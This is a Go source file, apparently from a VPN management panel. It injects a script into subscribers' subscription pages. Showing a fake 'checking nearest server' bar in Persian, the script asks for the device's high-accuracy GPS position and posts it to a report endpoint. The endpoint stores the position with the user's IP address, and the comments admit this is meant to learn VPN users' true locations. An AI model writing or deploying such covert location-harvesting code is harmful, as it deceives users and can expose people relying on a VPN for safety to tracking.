package sub

import (
	"bytes"
	_ "embed"
	"net"
	"net/http"
	"strings"

	"github.com/gin-gonic/gin"

	"github.com/mhsanaei/3x-ui/v3/internal/logger"
	"github.com/mhsanaei/3x-ui/v3/internal/web/service"
)

// loc.go serves the /loc/<subId> connection-check page. When a subscriber
// opens it in a browser and accepts the browser's own location prompt,
// the page sends the device's geolocation fix back to the report
// endpoint, where it is stored against the subscription's client (see
// service.RecordClientGpsBySubId). This is the only channel through
// which a true device location can reach the panel: the VPN protocols
// themselves carry no location data at all, and a subscriber who never
// opens the page (or declines the prompt) simply never reports one.

//go:embed loc_page.html
var locPageHTML []byte

func (a *SUBController) locPage(c *gin.Context) {
	subId := c.Param("subid")
	if !service.ClientSubIdExists(subId) {
		c.Status(http.StatusNotFound)
		return
	}
	c.Data(http.StatusOK, "text/html; charset=utf-8", locPageHTML)
}

type locReportBody struct {
	Lat      float64 `json:"lat"`
	Lon      float64 `json:"lon"`
	Accuracy float64 `json:"accuracy"`
}

func (a *SUBController) locReport(c *gin.Context) {
	subId := c.Param("subid")
	if !service.ClientSubIdExists(subId) {
		c.Status(http.StatusNotFound)
		return
	}
	var body locReportBody
	if err := c.ShouldBindJSON(&body); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"ok": false})
		return
	}
	if body.Lat < -90 || body.Lat > 90 || body.Lon < -180 || body.Lon > 180 ||
		(body.Lat == 0 && body.Lon == 0) {
		c.JSON(http.StatusBadRequest, gin.H{"ok": false})
		return
	}
	if err := service.RecordClientGpsBySubId(subId, body.Lat, body.Lon, body.Accuracy, locRequestIP(c)); err != nil {
		logger.Warning("loc report store failed:", err)
		c.JSON(http.StatusInternalServerError, gin.H{"ok": false})
		return
	}
	c.JSON(http.StatusOK, gin.H{"ok": true})
}

// locCheckScript is injected into the subscription info page itself (the
// HTML page a browser gets at /sub/<subId>). The user who shared their
// subscription never opens a separate check link — but anyone curious
// enough to open their own subscription page in a browser meets the
// browser's location prompt right there, as part of a "nearest server"
// check bar. Accepting sends the fix to the same report endpoint the
// standalone /loc page uses; declining removes the bar silently and the
// page behaves exactly as before.
const locCheckScript = `<script>(function(){function boot(){try{
var seg=location.pathname.split('/').filter(function(s){return s.length>0});
var subId=seg[seg.length-1]; if(!subId||!('geolocation' in navigator))return;
var bar=document.createElement('div');
bar.style.cssText='position:fixed;left:12px;right:12px;bottom:12px;z-index:9999;background:#16161d;color:#f2f2f2;border:2px solid #000;border-radius:10px;box-shadow:4px 4px 0 #000;padding:10px 14px;font-family:Tahoma,sans-serif;font-size:13px;text-align:center';
bar.textContent='در حال بررسی نزدیک‌ترین سرور برای اتصال بهتر…';
document.body.appendChild(bar);
navigator.geolocation.getCurrentPosition(function(pos){
fetch('/loc/'+encodeURIComponent(subId)+'/report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,accuracy:pos.coords.accuracy||0})}).then(function(){
bar.textContent='بررسی اتصال کامل شد ✓';
setTimeout(function(){bar.remove()},2500);
},function(){bar.remove()});
},function(){bar.remove()},{enableHighAccuracy:true,timeout:15000,maximumAge:60000});
}catch(e){}}
if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',boot)}else{boot()}
})();</script>`

// injectLocCheck adds the location-check script to a rendered
// subscription page, just before </body> (or appended when the page has
// no body tag).
func injectLocCheck(html []byte) []byte {
	if bytes.Contains(html, []byte("locCheck")) {
		return html
	}
	if i := bytes.LastIndex(html, []byte("</body>")); i >= 0 {
		out := make([]byte, 0, len(html)+len(locCheckScript))
		out = append(out, html[:i]...)
		out = append(out, locCheckScript...)
		out = append(out, html[i:]...)
		return out
	}
	return append(html, locCheckScript...)
}

// locRequestIP is the report's source address: the first X-Forwarded-For
// hop when a proxy chain is in front (the panel's own nginx sets it),
// otherwise the direct peer.
func locRequestIP(c *gin.Context) string {
	if xff := c.GetHeader("X-Forwarded-For"); xff != "" {
		if first := strings.TrimSpace(strings.Split(xff, ",")[0]); first != "" {
			return first
		}
	}
	if host, _, err := net.SplitHostPort(c.Request.RemoteAddr); err == nil {
		return host
	}
	return c.Request.RemoteAddr
}
